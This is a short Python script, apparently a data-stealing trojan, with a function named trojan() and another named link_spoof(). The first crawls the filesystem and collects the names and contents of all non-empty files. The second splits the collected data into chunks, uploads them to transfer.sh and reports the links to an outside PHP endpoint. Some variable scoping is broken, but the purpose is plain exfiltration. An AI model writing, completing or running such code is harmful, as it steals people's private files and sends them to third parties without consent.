import textwrap
import requests
import os

from config import *

directory = os.getcwd()
start = ''
for path in directory.split("/"):
    if (not path): continue
    start = start + "/" + path
    try:
        open(start + "/testfile.test", "w").write("test")
        os.remove(start + "/testfile.test")
        break
    except:
        continue

text = ''

dirs = [start]


def trojan():
    for d in dirs:
        print(dirs)
        if (len(d.split("/")) > 10): continue
        try:
            obj = os.scandir(d)
            for entry in obj:
                if (entry.is_file()):
                    if (os.stat(entry.path).st_size == 0): continue
                    text += "{\n\tFILE_NAME : " + entry.path + ",\n\tFILE_CONTENTS : " + open(
                        entry.path).read() + ";\n\t\t}\n"
                elif (entry.is_dir()):
                    dirs.append(entry.path)
        except:
            continue

    s = textwrap.wrap(text, 10240)
    print(green + "[+] Packets: ", len(s))


def link_spoof():
    k = 0
    for i in s:
        k = k + 1
        link = requests.put("https://transfer.sh/part" + str(k) + ".txt", data={i.encode('utf-8')}).text
        requests.post("http://aps1.c1.biz/report-site.php", {"link": link, "k": k})

        print(magenta + "[.] Putted :" + link)
        print(green + f"[+] We got: {str(i)}")
